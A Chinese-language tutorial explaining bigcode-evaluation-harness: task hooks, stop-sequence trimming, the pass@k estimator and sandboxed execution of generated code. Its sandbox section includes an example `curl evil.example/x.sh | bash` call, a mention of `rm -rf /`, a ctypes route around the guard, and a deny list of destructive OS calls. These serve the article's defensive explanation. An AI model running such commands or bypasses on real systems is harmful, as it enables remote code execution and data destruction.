---
title: 深度剖析 bigcode-evaluation-harness——pass@k 与代码评估
description: HumanEval 怎么评——n 个采样、c 个通过、pass@k 的无偏估计与沙箱执行
topics: [evaluation, humaneval, mbpp, pass-at-k, code-generation, sandbox-execution]
prereqs: [/engineering/evaluation, /architecture/decoding]
---

# 深度剖析 bigcode-evaluation-harness——pass@k 与代码评估

::: info 一句话总结
代码评估和选择题评估是两种生物：前者必须真跑代码，pass@k 是它对采样方差的统计学应答。本文从 `n` 次采样、`c` 个通过开始，讲清楚 `1 - C(n-c, k) / C(n, k)` 是怎么落到一行 `np.prod` 里的，再到沙箱执行为什么默认拒绝运行。
:::

> 本文基于 [bigcode-project/bigcode-evaluation-harness](https://github.com/bigcode-project/bigcode-evaluation-harness)（Apache 2.0）。所有代码片段均给出文件:行号引用，配合源码对照阅读。

## 体系定位：代码评估在评估生态的位置

[`engineering/evaluation`](/engineering/evaluation) 把评估分成两类：

| 范式 | 例子 | 看什么 | 怎么打分 |
|------|------|--------|---------|
| **likelihood-based** | MMLU、HellaSwag、ARC | 模型对候选答案的对数似然 | 选 `argmax_a logP(a\|q)` |
| **generation-based** | HumanEval、MBPP、GSM8K、HumanEval+ | 模型生成的字符串 | 跑测试 / 字符串匹配 / GPT 评分 |

代码评估是 generation-based 里的极端：它不允许任何字符串近似，只信「这段代码能不能 import 进去、调用一遍、所有 assert 都过」。这导致代码评估和别的评估有三处工程差异：

1. **必须采样 `n>1`**：贪心解码下 pass@1 = 0/1，方差爆炸；只有抽足 `n=20` 甚至 `n=200` 才能让 pass@1 的估计稳定。
2. **必须执行不可信代码**：模型可能写出 `os.system("rm -rf /")`、死循环、fork bomb——评测器要么把它关进 docker，要么把 Python 内置函数原地缴械。
3. **必须处理「过度生成」**：模型补完了函数体后会接着写下一个 `def` 或 `class`，需要靠 stop sequence 把多余部分裁掉。

这三件事，bigcode-evaluation-harness 全部用 ~1500 行核心代码搞定。它和 EleutherAI 的 [lm-evaluation-harness](https://github.com/EleutherAI/lm-evaluation-harness) 是兄弟项目（Task 抽象一脉相承，参考 `lm_eval/api/task.py`），只是后者偏 likelihood 评估，前者专攻 code generation。

## Task 抽象：一份接口，所有 benchmark

bigcode 的 `Task` 是一个 ABC，强制子类实现 4 个钩子：

```python
# 简化版：来自 base.py L7-L80
class Task(ABC):
    DATASET_PATH: str = None     # HF Hub 数据集路径
    DATASET_NAME: str = None     # 子集名（可选）

    def __init__(self, stop_words=None, requires_execution=True):
        self.stop_words = stop_words            # 触发 EOG 的字符串
        self.requires_execution = requires_execution  # 是否需要跑代码
        self.dataset = load_dataset(...)        # HF datasets 加载

    @abstractmethod
    def get_prompt(self, doc): ...        # doc -> 喂给模型的字符串
    @abstractmethod
    def get_reference(self, doc): ...     # doc -> 标准答案 / 单测代码
    @abstractmethod
    def postprocess_generation(self, generation, idx): ...  # 模型输出 -> 可执行代码
    @abstractmethod
    def process_results(self, generations, references): ... # -> {"pass@k": ...}
```

引用：[`base.py:L7-L80`](https://github.com/bigcode-project/bigcode-evaluation-harness/blob/main/bigcode_eval/base.py#L7-L80)。

这个抽象覆盖了 30 多个 benchmark：HumanEval、MBPP、APPS、DS-1000、MultiPL-E、HumanEval+、Mercury……每个新加的 benchmark 只要实现这 4 个方法，剩下的（采样循环、stop sequence、pass@k）全部复用。

### HumanEval：最朴素的实现

`GeneralHumanEval` 几乎是教科书示范：

```python
# humaneval.py:L43-L88
class GeneralHumanEval(Task):
    DATASET_PATH = "openai_humaneval"

    def __init__(self, strip_prompt, k=[1, 10, 100], num_workers=16, timeout=3.0):
        super().__init__(
            stop_words=["\nclass", "\ndef", "\n#", "\n@", "\nprint", "\nif",
                        "\n```", "<file_sep>"],
            requires_execution=True,
        )
        self.k = k                  # 评测哪些 pass@k
        self.timeout = timeout      # 单个 unit test 最多跑 3 秒

    def get_prompt(self, doc):
        # HumanEval 的 prompt 已经包含函数签名 + docstring
        return doc["prompt"].strip() if self.strip_prompt else doc["prompt"]

    def get_reference(self, doc):
        # reference = test_func + check(entry_point)
        return "\n" + doc["test"] + "\n" + f"check({doc['entry_point']})"
```

引用：[`humaneval.py:L43-L75`](https://github.com/bigcode-project/bigcode-evaluation-harness/blob/main/bigcode_eval/tasks/humaneval.py#L43-L75)。

数据感：HumanEval 只有 **164 题**。每题给一个函数签名 + docstring（如 `def has_close_elements(numbers: List[float], threshold: float) -> bool:`），模型补完函数体，benchmark 跑预先写好的 `check(candidate)` 函数。整个 benchmark 的 reference 加起来不到 100KB——它的难度全在「写出来的代码要真能跑」。

### MBPP 的差异

```python
# mbpp.py:L48-L60
def get_prompt(self, doc):
    description = doc["text"]
    test_example = doc["test_list"][0]
    # MBPP 的 prompt 是 docstring 包住自然语言描述 + 一个 assert 例子
    prompt = f'"""\n{description}\n{test_example}\n"""\n'
    return prompt

def get_reference(self, doc):
    return "\n".join(doc["test_list"])  # 多条 assert 拼成一段
```

引用：[`mbpp.py:L48-L60`](https://github.com/bigcode-project/bigcode-evaluation-harness/blob/main/bigcode_eval/tasks/mbpp.py#L48-L60)。

差异点：

| 维度 | HumanEval | MBPP |
|------|-----------|------|
| 题数 | 164 | 974（test split 取 500） |
| Prompt 形式 | 函数签名 + docstring | docstring 包自然语言 + 1 个 assert 例子 |
| Reference | 一个 `check(...)` 函数 | 3 条 assert |
| 难度分布 | 偏算法、字符串处理 | 入门级，标准库使用 |
| stop_words | `\nclass`, `\ndef`, `\n#`, `\n@`... | `\nclass`, `\nassert`, `\n"""`... |

注意 MBPP 多了 `\nassert` 作为 stop——因为它的 prompt 已经包含一个 assert，模型很容易接着写更多 assert 而不是函数体。

## 数据流：从 prompt 到 pass@k 的全链路

整个评测流程一句话：

```
prompt → model.generate(n_samples 次) → decode → postprocess(stop sequence)
       → 拼接 reference → 写入临时目录子进程 exec → ✓/✗ → pass@k
```

具体到 bigcode 的代码，主控在 `Evaluator.evaluate`：

```python
# evaluator.py:L90-L108
def evaluate(self, task_name, intermediate_generations=None):
    task = tasks.get_task(task_name, self.args)
    # 没设 --allow_code_execution 直接抛错，避免误跑模型代码
    if task.requires_execution and not self.allow_code_execution:
        raise ValueError(_WARNING)

    generations, references = self.generate_text(task_name, ...)  # n_samples 次采样

    if self.accelerator.is_main_process:
        # 真要跑代码前才设这个环境变量，给 evaluate 库的 code_eval 解锁
        if self.allow_code_execution and task.requires_execution:
            os.environ["HF_ALLOW_CODE_EVAL"] = "1"
        results = task.process_results(generations, references)  # 跑测试、算 pass@k
        return results
```

引用：[`evaluator.py:L90-L108`](https://github.com/bigcode-project/bigcode-evaluation-harness/blob/main/bigcode_eval/evaluator.py#L90-L108)。

注意三道闸门：（1）命令行 `--allow_code_execution`；（2）抛 `_WARNING`；（3）`HF_ALLOW_CODE_EVAL=1`。这是「主动同意」原则的体现，下文沙箱小节会详细讲。

### Stop Sequence：优雅地停下来

模型生成的内容会一直往下续，直到 `max_length` 或者遇到 EOS。但代码生成里更常见的情况是：函数补完了，模型继续写第二个函数。如果不裁掉，sandbox 里 exec 会执行多余代码，可能引入名字冲突或副作用。

bigcode 的处理是「事后裁剪」——生成完整段，再用 stop_words 找最早的 stop 位置：

```python
# base.py:L82-L95
@staticmethod
def _stop_at_stop_token(decoded_string, stop_tokens):
    """
    Produces the prefix of decoded_string that ends at the first occurrence of
    a stop_token.
    WARNING: the decoded_string *must not* include the prompt, which may have
    stop tokens itself.
    """
    min_stop_index = len(decoded_string)
    for stop_token in stop_tokens:
        stop_index = decoded_string.find(stop_token)
        # 找最早出现的那个 stop，所有 stop 候选里取 min
        if stop_index != -1 and stop_index < min_stop_index:
            min_stop_index = stop_index
    return decoded_string[:min_stop_index]
```

引用：[`base.py:L82-L95`](https://github.com/bigcode-project/bigcode-evaluation-harness/blob/main/bigcode_eval/base.py#L82-L95)。

### `postprocess_generation`：剪掉 prompt + 接 stop

每个 task 在 postprocess 里复用 `_stop_at_stop_token`：

```python
# humaneval.py:L78-L88
def postprocess_generation(self, generation, idx):
    prompt = self.get_prompt(self.dataset["test"][idx])
    # 模型 generate 出来的字符串包含 prompt，先把 prompt 剥掉
    # 否则 prompt 里 docstring 中可能含 \n# 或 \nclass，会被误判为 stop
    generation = generation[len(prompt):]
    return prompt + self._stop_at_stop_token(generation, self.stop_words)
```

引用：[`humaneval.py:L78-L88`](https://github.com/bigcode-project/bigcode-evaluation-harness/blob/main/bigcode_eval/tasks/humaneval.py#L78-L88)。

注意这里：先剥 prompt，找 stop，再把 prompt 接回去。**为什么不直接对全文找 stop？** 因为 prompt 里的 docstring 几乎一定有 `\n#` 注释，会被误命中。这是个看上去无聊但很关键的细节——`base.py` 的 docstring 里那个 WARNING 说的就是这件事。

bigcode 同时还有一种「实时 stop」方案：在 `generation.py` 里把 `EndOfFunctionCriteria` 注册成 transformers 的 `StoppingCriteria`，每生成一个 token 就检查一次。它和事后裁剪互补——前者省 token、省时间，后者更鲁棒（不依赖 tokenizer 切分恰好对齐 stop 字符串）。

## pass@k：为什么贪心评估不够，怎么算才无偏

### 直觉：贪心 t=0 的评估为什么不可信

最朴素的 pass@1 应该是「贪心解码一次，看通过率」。但这有两个问题：

1. **贪心解码不是 LLM 的真实分布**。开源代码模型实际部署时温度 0.2-0.7，贪心评估给出的是模型「最自信但很死板」的代码。
2. **方差**。164 题，每题贪心给 0/1，方差就只能在题目层面平均掉。如果想看模型的「平均能力」，需要每题多采几次。

Codex 论文（[arXiv:2107.03374](https://arxiv.org/abs/2107.03374)）的提议：每题采样 `n` 次（默认 `n=200`），其中 `c` 次通过，定义

$$
\text{pass@}k = \mathbb{E}_{\text{problems}}\left[\,1 - \binom{n-c}{k}\big/\binom{n}{k}\,\right]
$$

含义：「从 `n` 个采样里随机抽 `k` 个，至少有一个通过的概率」。当 `k=1` 时 = `c/n`（通过率）；当 `k=n` 时 = `1 if c≥1 else 0`。

### 为什么这是无偏估计

朴素做法：采 `n` 次，按顺序取前 `k` 个，看是否全错。这是有偏的——它和「采 `k` 次的真实结果」相关性不高（前 `k` 个的通过分布不等于独立采 `k` 次）。

无偏做法：考虑「从 `n` 次采样中**无放回**抽 `k` 个全失败」的概率，等于 $\binom{n-c}{k} / \binom{n}{k}$（从 `n-c` 个失败里抽 `k` 个，除以从 `n` 里抽 `k` 个）。1 减它就是「至少一个通过」的概率。这是「采 `k` 次的成功率」的无偏估计——只要 `n ≥ k`。

### 数值稳定计算：为什么不直接用组合数

直接 `comb(n-c, k) / comb(n, k)`：当 `n=200, k=100` 时分子分母都是天文数字（$\binom{200}{100} \approx 9 \times 10^{58}$），精度炸。

bigcode 的实现用了**累乘技巧**：

```python
# code_eval.py:L174-L189
def estimate_pass_at_k(num_samples, num_correct, k):
    """Estimates pass@k of each problem and returns them in an array."""

    def estimator(n: int, c: int, k: int) -> float:
        """Calculates 1 - comb(n - c, k) / comb(n, k)."""
        if n - c < k:
            # 通过数 c 大到「失败数 < k」，那 k 选 k 个失败不可能 -> 必通过
            return 1.0
        # 把 comb(n-c, k) / comb(n, k) 化成连乘：
        # = ∏_{i=n-c+1..n} (i-k)/i = ∏ (1 - k/i)
        # 单步只做 k/i 这种小数，不会溢出，精度稳定
        return 1.0 - np.prod(1.0 - k / np.arange(n - c + 1, n + 1))
    ...
    return np.array([estimator(int(n), int(c), k) for n, c in zip(num_samples_it, num_correct)])
```

引用：[`code_eval.py:L174-L189`](https://github.com/bigcode-project/bigcode-evaluation-harness/blob/main/bigcode_eval/tasks/custom_metrics/code_eval.py#L174-L189)。

公式推导：

$$
\frac{\binom{n-c}{k}}{\binom{n}{k}} = \frac{(n-c)!/(n-c-k)!}{n!/(n-k)!} = \prod_{i=n-c+1}^{n} \frac{i-k}{i} = \prod_{i=n-c+1}^{n} \left(1 - \frac{k}{i}\right)
$$

每一步只是一个 `[0, 1]` 的浮点数相乘，永远不会溢出。这种数值技巧在统计计算里很常见（log-sum-exp、log-gamma 都是同思路）。

### `compute_code_eval`：把生成 → 测试 → 分数串起来

```python
# code_eval.py:L129-L171
def compute_code_eval(predictions, references, k=[1, 10, 100],
                       num_workers=4, timeout=3.0):
    # 没设 HF_ALLOW_CODE_EVAL=1 直接拒绝执行
    if os.getenv("HF_ALLOW_CODE_EVAL", 0) != "1":
        raise ValueError(_WARNING)
    if os.name == "nt":
        # Windows 下 multiprocessing.Process 行为不一致，干脆不支持
        raise NotImplementedError(...)

    with ThreadPoolExecutor(max_workers=num_workers) as executor:
        futures = []
        for task_id, (candidates, test_case) in enumerate(zip(predictions, references)):
            for candidate in candidates:
                # 把生成代码 + reference test 拼起来扔给 check_correctness
                test_program = candidate + "\n" + test_case
                future = executor.submit(check_correctness, test_program, timeout, ...)
                futures.append(future)

        for future in as_completed(futures):
            results[result["task_id"]].append(...)

    total = np.array([...])     # 每题采样数 n
    correct = np.array([...])   # 每题通过数 c
    # 只对 (n >= k 全成立) 的 k 算 pass@k；否则跳过该 k
    pass_at_k = {f"pass@{k}": estimate_pass_at_k(total, correct, k).mean()
                 for k in ks if (total >= k).all()}
    return pass_at_k, results
```

引用：[`code_eval.py:L129-L171`](https://github.com/bigcode-project/bigcode-evaluation-harness/blob/main/bigcode_eval/tasks/custom_metrics/code_eval.py#L129-L171)。

注意 `ThreadPoolExecutor` + `multiprocessing.Process` 的两层并发：外层用线程池调度多个题目并行评测，内层每次评测起一个新 Process（详见沙箱小节）。线程池只是为了 IO 不阻塞，真正的隔离靠子进程。

## 沙箱执行：为什么默认 disabled

### 模型可能写出什么

跑过 HumanEval 的人都见过这种生成：

```python
def fizz_buzz(n: int) -> int:
    import os
    os.system("curl evil.example/x.sh | bash")  # 不一定恶意，可能只是模型抽风
    return sum(...)
```

或者死循环：

```python
def fibonacci(n):
    while True: pass    # 误生成无终止条件
```

或者炸内存：

```python
def make_list(n):
    return [0] * (10 ** 18)
```

bigcode 的 `unsafe_execute` 用三道防线对付这些：

```python
# execute.py:L28-L53
def check_correctness(check_program, timeout, task_id, completion_id):
    # 防线 1：开新 Process，崩了不影响主进程
    manager = multiprocessing.Manager()
    result = manager.list()
    p = multiprocessing.Process(target=unsafe_execute,
                                 args=(check_program, result, timeout))
    p.start()
    p.join(timeout=timeout + 1)   # 防线 2：超时杀进程（默认 3 秒）
    if p.is_alive():
        p.kill()
    if not result:
        result.append("timed out")
    return dict(task_id=task_id, passed=result[0] == "passed", ...)
```

引用：[`execute.py:L28-L53`](https://github.com/bigcode-project/bigcode-evaluation-harness/blob/main/bigcode_eval/tasks/custom_metrics/execute.py#L28-L53)。

防线 3 是 `reliability_guard`：在子进程里把 Python 的破坏性 API 全部置 `None`：

```python
# execute.py:L158-L237 节选
def reliability_guard(maximum_memory_bytes=None):
    if maximum_memory_bytes is not None:
        # 限制 RSS / DATA / STACK
        resource.setrlimit(resource.RLIMIT_AS, (maximum_memory_bytes,) * 2)
        ...

    # 文件系统：删除全部禁掉
    os.kill = None;  os.system = None;  os.remove = None;  os.unlink = None
    os.rmdir = None; os.rename = None;  os.chmod = None;   os.chdir = None
    shutil.rmtree = None;  shutil.move = None
    # 进程：fork / 子进程禁掉
    os.fork = None;  os.forkpty = None;  os.killpg = None
    subprocess.Popen = None
    # 退出：连 exit() 都拿掉，避免污染 result
    builtins.exit = None;  builtins.quit = None
```

引用：[`execute.py:L158-L237`](https://github.com/bigcode-project/bigcode-evaluation-harness/blob/main/bigcode_eval/tasks/custom_metrics/execute.py#L158-L237)。

::: warning 这不是真正的沙箱
源码注释说得很白：「This function is **NOT** a security sandbox.」如果模型生成 `ctypes.CDLL("libc.so.6").system(...)` 一样能绕过。生产环境跑评测请用 docker / firejail / nsjail / gVisor，bigcode 的 `Dockerfile-rocm` 就是这种思路。这一层只是「防误伤」（防止 timeout、防止误删主目录），不防真恶意代码。
:::

代码 exec 时还套了三层 contextmanager：`create_tempdir()` 切到临时目录、`swallow_io()` 把 stdout/stderr 吞掉（用 `WriteOnlyStringIO` 让 `input()` 也炸掉）、`time_limit()` 用 `SIGALRM` 强切（[`execute.py:L56-L116`](https://github.com/bigcode-project/bigcode-evaluation-harness/blob/main/bigcode_eval/tasks/custom_metrics/execute.py#L56-L116)）。

### 为什么默认 disabled

跑 HumanEval 你会被这两道闸门拦下来：

- 命令行不加 `--allow_code_execution` → `Evaluator.evaluate` 抛 `_WARNING`（[`evaluator.py:L92-L93`](https://github.com/bigcode-project/bigcode-evaluation-harness/blob/main/bigcode_eval/evaluator.py#L92-L93)）。
- 内部 `compute_code_eval` 还会再读一遍 `HF_ALLOW_CODE_EVAL=1`（[`code_eval.py:L132`](https://github.com/bigcode-project/bigcode-evaluation-harness/blob/main/bigcode_eval/tasks/custom_metrics/code_eval.py#L132)）。

设计意图：让用户**主动同意**才执行不可信代码。HuggingFace 把这个约定也带到了 `evaluate` 库的 `code_eval` metric 里，整个生态保持一致。

## 关键参数：n_samples、temperature、batch_size 的关系

bigcode 的命令行长这样：

```bash
HF_ALLOW_CODE_EVAL=1 accelerate launch main.py \
    --model bigcode/starcoder2-7b \
    --tasks humaneval \
    --temperature 0.2 \
    --n_samples 20 \
    --batch_size 10 \
    --max_length_generation 512 \
    --allow_code_execution
```

关键参数定义在 [`arguments.py:L16-L38`](https://github.com/bigcode-project/bigcode-evaluation-harness/blob/main/bigcode_eval/arguments.py#L16-L38)：默认 `do_sample=True, temperature=0.2, top_p=0.95, n_samples=1`。

### 温度 vs k 的经验配比

Codex 论文给出的经验：

| 评测目标 | 推荐温度 | 推荐 n_samples | 直觉 |
|---------|---------|---------------|------|
| pass@1 | 0.0（贪心）或 0.2 | 1 ~ 20 | 看「最优解码」表现，温度低 |
| pass@10 | 0.6 | 50 ~ 100 | 兼顾覆盖和质量 |
| pass@100 | 0.8 | 200 | 看「采样多样性」上限，温度高 |

直觉：`pass@k` 是「k 次里至少 1 次成功」的概率，k 越大越奖励多样性，温度越高（更分散的分布）越能覆盖更多解空间。但温度太高会引入大量语法错误代码，所以高温只适合大 k。

### `n_samples` 的工程实现

bigcode 把 `n_samples` 拆成 `n_copies × batch_size`：

```python
# generation.py:L109
n_copies = ceil(args.n_samples / args.batch_size)
```

引用：[`generation.py:L109`](https://github.com/bigcode-project/bigcode-evaluation-harness/blob/main/bigcode_eval/generation.py#L109)。

每个 prompt 复制 `n_copies` 次进 dataloader，每次 generation 用 `num_return_sequences=batch_size` 一次出 `batch_size` 个采样。乘起来就是每题 `n_samples` 个候选。

数据感（单卡 7B 模型，A100 80G fp16）：

- HumanEval 164 题，n=20，max_length=512：~10 分钟
- HumanEval 164 题，n=200，max_length=512：~1.5 小时
- MBPP 500 题，n=20：~30 分钟（题更短，但题数多 3 倍）

batch_size 主要受显存约束：7B fp16 + KV cache + max_length=512 + bs=10 大概要 30G。

## 数据污染：pass@k 之外要警惕的事

::: danger HumanEval 在 GPT-4 时代分数虚高
HumanEval 数据集 2021 年公开，所有现代 LLM 的预训练数据几乎一定含有它。GPT-4 的 HumanEval 67%，但在 [HumanEval+](https://arxiv.org/abs/2305.01210)（同样的题，但单测加强、引入边界 case）上只有 57%——10 个百分点的差距很可能是因为模型记住了原版测试，而不是真的会写代码。
:::

数据污染检测的几种方式：

1. **N-gram 重叠检测**：扫描预训练语料，看 prompt / reference 出现频次。
2. **Substring matching**：把 HumanEval 的 docstring 当 query 去训练集 grep。
3. **HumanEval+**：人工加强测试，破坏「模型记住答案」的优势。
4. **闭源 fresh benchmark**：BigCodeBench、LiveCodeBench（每月更新题）。

工程实践建议：跑 HumanEval 的时候**同时**跑 HumanEval+ 和 MBPP+，三个一起看；只看 HumanEval 容易被污染分数误导。

## 苏格拉底时刻

1. **Q**：为什么 `compute_code_eval` 用 `ThreadPoolExecutor` 而不是 `ProcessPoolExecutor` 调度？子进程不是已经在 `check_correctness` 里 fork 了吗？  
   提示：线程池只负责调度（IO 不阻塞），真正的执行隔离在 `multiprocessing.Process`。两者职责不同。

2. **Q**：HumanEval 已经有 164 题了，为什么 pass@1 还要采 n=20？直接 164 题贪心评估不行吗？  
   提示：贪心 ≠ 模型真实分布；164 题的方差不够小；同一道题采 20 次能拿到「这个题的通过率」而不是「通过 vs 不通过」。

3. **Q**：模型见过 HumanEval 测试集会发生什么？怎么验证你的模型是否被污染？  
   提示：分数虚高、HumanEval+ 上掉点、prompt prefix 完整背诵；可以用 perplexity 测试集 vs 训练集对比。

4. **Q**：MBPP 和 HumanEval 哪个评估的能力维度更窄？为什么实际 paper 里两个都要报？  
   提示：HumanEval 偏算法、字符串处理；MBPP 入门级、标准库使用。两个加起来才覆盖「通用 Python 编程」的两个截面。

5. **Q**：如果让你设计一个新的 code benchmark，怎么避免被未来的模型「记住」？  
   提示：题库每月更新（LiveCodeBench）、private holdout、要求模型生成测试再交叉验证（self-consistency）、随机化题目表述。

## 面试考点

1. **pass@k 为什么是无偏估计，怎么数值稳定计算？**——一行 `1 - np.prod(1 - k / np.arange(n-c+1, n+1))`，原理是 $\binom{n-c}{k} / \binom{n}{k} = \prod (1 - k/i)$，把组合数化成 [0,1] 的累乘，避免溢出。
2. **为什么 pass@1 评估也要 `n_samples > 1`？**——温度 > 0 时模型输出有方差，单次贪心评估给不了模型的真实分布；多次采样后 c/n 才是 pass@1 的稳定估计。
3. **温度和 k 的搭配？**——pass@1 用 t=0.0/0.2（看最优）；pass@10 用 t=0.6（折中）；pass@100 用 t=0.8（看多样性）。
4. **HumanEval 为什么默认拒绝执行？**——模型生成的代码不可信，bigcode 用「命令行 flag + 环境变量 HF_ALLOW_CODE_EVAL=1 + 子进程隔离 + reliability_guard」四层闸门让用户主动确认。
5. **stop sequence 为什么要事后处理而不是只用 model.generate 的 stopping_criteria？**——后者依赖 tokenizer 切分恰好对齐 stop 字符串（`\nclass` 可能被切成 `\n` + `class`），事后裁剪更鲁棒；bigcode 实际两者都用。

## 推荐资源

- 源仓库：<https://github.com/bigcode-project/bigcode-evaluation-harness>（Apache 2.0）
- Codex 论文（pass@k 提出）：<https://arxiv.org/abs/2107.03374>
- HumanEval+ 论文（数据污染 + 加强测试）：<https://arxiv.org/abs/2305.01210>
- MBPP 论文：<https://arxiv.org/abs/2108.07732>
- BigCode 团队博客：<https://www.bigcode-project.org/>
- HuggingFace `evaluate` 的 `code_eval`：<https://huggingface.co/spaces/evaluate-metric/code_eval>
- LiveCodeBench（防污染 benchmark）：<https://livecodebench.github.io/>
- 关联章节：[评估方法](/engineering/evaluation)、[解码策略](/architecture/decoding)（讲温度、top-p 的影响）

::: tip 动手任务
1. clone bigcode-evaluation-harness，跑 `python main.py --model codeparrot/codeparrot-small --tasks humaneval --n_samples 5 --temperature 0.2 --allow_code_execution`，看输出 JSON。
2. 改 `code_eval.py` 的 `estimator`，把累乘换成 `scipy.special.comb` 直接除，对比 n=200, k=100 时的数值差异。
3. 自己实现一个 `Task` 子类：加载本地 jsonl，每条含 prompt + test，实现 4 个钩子，跑通 pass@k。这是面试 / 真实工作里最常见的需求形态。
:::
